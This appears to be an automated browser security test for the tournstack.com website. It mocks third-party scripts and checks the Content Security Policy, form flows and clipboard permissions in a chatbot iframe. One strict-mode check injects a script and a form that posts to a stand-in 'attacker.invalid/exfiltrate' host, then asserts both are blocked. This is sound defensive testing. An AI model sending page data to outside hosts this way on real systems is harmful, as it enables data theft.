// Browser verification with every HTTP(S) request intercepted. No live submissions/SDKs.
'use strict';
const fs = require('node:fs'), path = require('node:path'), assert = require('node:assert/strict');
const {chromium} = require(process.env.TS_PLAYWRIGHT || 'playwright');
const {browserHeaders} = require('./security-policy.cjs');
const {allowed} = require('../../scripts/public-artifact.cjs');
const root = path.resolve(__dirname, '../..');
const mime = {'.html':'text/html; charset=utf-8','.js':'application/javascript','.css':'text/css','.svg':'image/svg+xml','.webp':'image/webp','.avif':'image/avif','.woff':'font/woff','.woff2':'font/woff2','.png':'image/png'};
const turnstile = `window.turnstile={_widgets:[],render(selector,options){const el=document.querySelector(selector),input=document.createElement('input');input.type='hidden';input.name='cf-turnstile-response';input.value='synthetic-token';el.append(input);const id=this._widgets.push({options})-1;queueMicrotask(()=>options.callback('synthetic-token'));return id;},getResponse(){return 'synthetic-token'},reset(id){queueMicrotask(()=>this._widgets[id].options.callback('synthetic-token'))}};`;
const result = {environment:'Chrome, mocked network and provider scripts; no real provider compatibility claim',checks:[],liveRequests:0,liveSubmissions:0};
(async () => {
  const browser = await chromium.launch({channel:'chrome',headless:true});
  try {
    for (const strict of [false,true]) for (const width of [1440,390]) {
      const context = await browser.newContext({viewport:{width,height:900},reducedMotion:'reduce'});
      const attempts = [], errors = [];
      await context.addInitScript(() => {
        window.__violations = [];
        document.addEventListener('securitypolicyviolation', e => window.__violations.push({directive:e.effectiveDirective,blocked:e.blockedURI,disposition:e.disposition}));
        window.__consent = {isUserActionCompleted:true,categories:{advertisement:true},consentID:'synthetic-choice'};
        window.getCkyConsent = () => window.__consent;
        localStorage.setItem('tournstack-advertising-choice',JSON.stringify({version:'advertising-2026-10-15-v2',consentID:'synthetic-choice',expires:Date.now()+600000}));
      });
      await context.route('**/*', async route => {
        const req = route.request(), url = new URL(req.url());
        attempts.push({host:url.hostname,path:url.pathname,method:req.method()});
        if (url.hostname === 'tournstack.com' && req.method() === 'GET') {
          const name = url.pathname === '/' ? 'index.html' : decodeURIComponent(url.pathname).slice(1);
          const file = path.resolve(root,name);
          if (!allowed(name) || !file.startsWith(root+path.sep) || !fs.existsSync(file)) return route.fulfill({status:404,body:'Not found'});
          return route.fulfill({contentType:mime[path.extname(file)]||'text/plain',headers:browserHeaders(root,strict),body:fs.readFileSync(file)});
        }
        if (url.hostname === 'challenges.cloudflare.com') return route.fulfill({contentType:'application/javascript',body:turnstile});
        if (url.hostname === 'cdn-cookieyes.com') return route.fulfill({contentType:'application/javascript',body:'/* synthetic hosted CMP; current choice injected by harness */'});
        if (url.hostname === 'plausible.io') return route.fulfill({contentType:'application/javascript',body:'window.plausible=window.plausible||function(){};window.plausible.init=function(){};'});
        if (url.hostname === 'connect.facebook.net') return route.fulfill({contentType:'application/javascript',body:'window.fbq.callMethod=function(){};'});
        if (url.hostname === 'snap.licdn.com') return route.fulfill({contentType:'application/javascript',body:'window.__linkedinFixtureLoaded=true;'});
        if (url.hostname === 'script.google.com' && req.method() === 'POST') {
          const params = new URLSearchParams(req.postData());
          const receipt = {type:params.get('Kind')?.startsWith('newsletter')?'tournstack-newsletter-result':'tournstack-contact-result',submissionId:params.get('SubmissionId'),ok:true};
          const nested = 'https://fixture-script.googleusercontent.com/receipt?data='+encodeURIComponent(JSON.stringify(receipt));
          return route.fulfill({contentType:'text/html',body:'<!doctype html><iframe src="'+nested.replace(/&/g,'&amp;')+'"></iframe>'});
        }
        if (url.hostname === 'fixture-script.googleusercontent.com') {
          const data = JSON.parse(url.searchParams.get('data'));
          return route.fulfill({contentType:'text/html',body:'<!doctype html><script>window.top.postMessage('+JSON.stringify(data)+',"https://tournstack.com");</script>'});
        }
        if (url.hostname === 'tournstack-public-chat.tournstack.workers.dev') return route.fulfill({contentType:'text/html',body:'<!doctype html><p>Future Niko iframe fixture</p>'});
        if (url.hostname === 'attacker.invalid' && url.pathname === '/frame') return route.fulfill({contentType:'text/html',body:'<!doctype html><iframe src="https://tournstack.com/"></iframe>'});
        return route.abort();
      });
      const page = await context.newPage();
      page.on('pageerror', e => errors.push(e.message));
      await page.goto('https://tournstack.com/');
      await page.waitForFunction(() => window.__linkedinFixtureLoaded);
      assert.equal(await page.evaluate(() => window.__violations.length),0,'Known mocked homepage resources violate CSP');
      if (!await page.locator('iframe[src*="tournstack-public-chat"]').count()) await page.evaluate(() => { const frame=document.createElement('iframe');frame.src='https://tournstack-public-chat.tournstack.workers.dev/';document.body.append(frame); });
      await page.frameLocator('iframe[src*="tournstack-public-chat"]').getByText('Future Niko iframe fixture').waitFor();
      assert.equal(await page.evaluate(() => window.__violations.length),0);
      await page.goto('https://tournstack.com/contact.html');
      await page.locator('#contact-form input[name="Name"]').fill('Synthetic Test');
      await page.locator('#contact-form input[name="Email"]').fill('synthetic@example.invalid');
      await page.locator('#contact-form textarea').fill('Local security test; never delivered.');
      await page.locator('#contact-form button[type="submit"]').click();
      await page.waitForURL('https://tournstack.com/inquiry-received.html');
      await page.goto('https://tournstack.com/');
      await page.locator('#newsletter-email').fill('synthetic@example.invalid');
      const consent = page.locator('#newsletter-signup input[type="checkbox"]');
      if (await consent.count()) await consent.check();
      await page.locator('#newsletter-signup button[type="submit"]').click();
      await page.waitForFunction(() => document.querySelector('#newsletter-status').textContent.includes('Check your inbox'));
      assert.equal(await page.evaluate(() => window.__violations.length),0,'Nested Google receipt flow violates CSP');
      assert.equal(await page.evaluate(async () => (await fetch('/integrations/google-apps-script/Code.gs')).status),404);
      assert.equal(errors.length,0,errors.join('; '));
      result.checks.push({strict,width,status:'PASS',scope:'homepage, mocked consented scripts, Turnstile, nested Google contact/newsletter receipt and future Niko frame'});
      if (strict && width===390) {
        await page.evaluate(() => {
          const script=document.createElement('script');script.textContent='window.__unapprovedScript=true';document.body.append(script);
          const form=document.createElement('form');form.method='POST';form.action='https://attacker.invalid/exfiltrate';document.body.append(form);form.submit();
        });
        await page.waitForFunction(() => window.__violations.some(v => v.directive==='form-action') && window.__violations.some(v => v.directive==='script-src-elem'));
        assert.equal(await page.evaluate(() => !!window.__unapprovedScript),false);
        assert(!attempts.some(a=>a.host==='attacker.invalid'&&a.path==='/exfiltrate'));
        await page.goto('https://attacker.invalid/frame');
        await page.waitForTimeout(100);
        assert(!page.frames().some(f=>f.url()==='https://tournstack.com/'));
        result.checks.push({status:'PASS',scope:'unapproved inline script, offsite form submission and hostile framing blocked'});
      }
      await context.close();
    }
    // The production embed is cross-origin. Verify its actual palette renderer without
    // touching the OS clipboard or changing the source launch flag.
    const richPath = process.env.TS_NIKO_RICH || path.resolve(root, '../../PublicChatbot/Production/web/preview-rich.js');
    if (!fs.existsSync(richPath)) {
      result.checks.push({status:'SKIP',scope:'actual Niko embedded HEX copy',reason:'Set TS_NIKO_RICH to the maintained Production/web/preview-rich.js'});
    } else {
      const loader = fs.readFileSync(path.join(root,'assets/js/chatbot.js'),'utf8');
      assert.match(loader,/const ENABLED=(?:true|false);/,'Loader must retain an explicit launch control');
      const enabledLoader = loader.replace(/const ENABLED=(?:true|false);/,'const ENABLED=true;');
      const rich = fs.readFileSync(richPath,'utf8');
      const palette = [['Electric Blue','#1E6CFF','main'],['Deep Slate','#0F172A','main'],['Soft White','#F8FAFC','main'],['Warm Coral','#FF8B72','main'],['Action Blue','#1855CC','functional'],['Court Blue','#6EA0FF','functional']].map(([name,hex,group])=>({name,hex,group}));
      const logos = [['FullColor_LightBG_RGB','fa1887797d2619a4','light'],['Reversed_DarkBG_RGB','51bb0b6621af525a','dark']].map(([stem,hashPrefix,variant])=>({url:'https://tournstack.com/assets/versioned/brand/TS_Primary_H_'+stem+'.'+hashPrefix+'.svg',hashPrefix,filename:'tournstack-logo-'+variant+'-background.svg',variant}));
      for (const strict of [false,true]) for (const width of [1440,390]) {
        const context = await browser.newContext({viewport:{width,height:900},reducedMotion:'reduce',serviceWorkers:'block'});
        const errors=[];
        await context.addInitScript(()=>{
          window.__clipboardWrites=[];window.__copyFailure=false;
          Object.defineProperty(navigator,'clipboard',{configurable:true,value:{
            async writeText(value){if(!document.featurePolicy.allowsFeature('clipboard-write')||window.__copyFailure)throw Error('Mock clipboard unavailable');window.__clipboardWrites.push(value);},
            async readText(){throw Error('Reading the clipboard is forbidden in this test');}
          }});
        });
        await context.route('**/*',async route=>{
          const url=new URL(route.request().url());
          if(url.origin==='https://tournstack.com'&&url.pathname==='/')return route.fulfill({contentType:'text/html',headers:browserHeaders(root,strict),body:'<!doctype html><html lang="en"><title>Embedded Niko test</title><body><h1>Embedded Niko test</h1><script src="/assets/js/chatbot.js"></script></body></html>'});
          if(url.origin==='https://tournstack.com'&&url.pathname==='/assets/js/chatbot.js')return route.fulfill({contentType:'application/javascript',body:enabledLoader});
          if(url.origin==='https://tournstack.com'&&url.pathname==='/assets/brand/TS_Niko_Launcher_Shield_RGB.svg')return route.fulfill({contentType:'image/svg+xml',body:fs.readFileSync(path.join(root,url.pathname.slice(1)))});
          if(url.origin==='https://tournstack-public-chat.tournstack.workers.dev'){
            if(url.pathname==='/')return route.fulfill({contentType:'text/html',headers:{'Content-Security-Policy':"default-src 'none'; script-src 'self'; connect-src 'self'; frame-ancestors https://tournstack.com"},body:'<!doctype html><html lang="en"><title>Niko palette fixture</title><body><p id="answer">Electric Blue #1E6CFF</p><script src="/preview-rich.js"></script><script src="/embed-fixture.js"></script></body></html>'});
            if(url.pathname==='/preview-rich.js')return route.fulfill({contentType:'application/javascript',body:rich});
            if(url.pathname==='/embed-fixture.js')return route.fulfill({contentType:'application/javascript',body:"NikoRich.enhance(document.getElementById('answer'));parent.postMessage({channel:'tournstack-niko-v1',type:'state',open:true},'https://tournstack.com');"});
            if(url.pathname==='/api/presentation')return route.fulfill({contentType:'application/json',body:JSON.stringify({palette,logos})});
          }
          return route.abort();
        });
        const page=await context.newPage();page.on('pageerror',e=>errors.push(e.message));await page.goto('https://tournstack.com/');await page.locator('#niko-chat-launcher').click();
        const frame=page.frameLocator('#niko-chat-frame'),button=frame.getByRole('button',{name:'Copy Electric Blue HEX #1E6CFF',exact:true});await button.waitFor();
        assert.equal(await page.locator('#niko-chat-frame').getAttribute('allow'),'clipboard-write');
        const child=page.frames().find(f=>f.url()==='https://tournstack-public-chat.tournstack.workers.dev/');
        assert.deepEqual(await child.evaluate(()=>({write:document.featurePolicy.allowsFeature('clipboard-write'),read:document.featurePolicy.allowsFeature('clipboard-read')})),{write:true,read:false});
        await button.focus();await page.keyboard.press('Enter');await frame.getByRole('status').filter({hasText:/^Copied$/}).waitFor();
        assert.deepEqual(await child.evaluate(()=>window.__clipboardWrites),['#1E6CFF']);
        assert.equal(await button.evaluate(el=>document.activeElement===el),true,'Copy must preserve keyboard focus');
        await child.evaluate(()=>{window.__copyFailure=true;});await button.click();await frame.getByRole('status').filter({hasText:'Could not copy. Select #1E6CFF and copy it manually.'}).waitFor();
        assert.deepEqual(await child.evaluate(()=>window.__clipboardWrites),['#1E6CFF']);assert.deepEqual(errors,[]);
        result.checks.push({strict,width,status:'PASS',scope:'real loader + Niko palette renderer in sandboxed cross-origin frame; write-only permission, keyboard mock copy, focus and manual fallback'});
        await context.close();
      }
    }
    console.log(JSON.stringify(result,null,2));
  } finally { await browser.close(); }
})().catch(e=>{console.error(e);process.exitCode=1;});
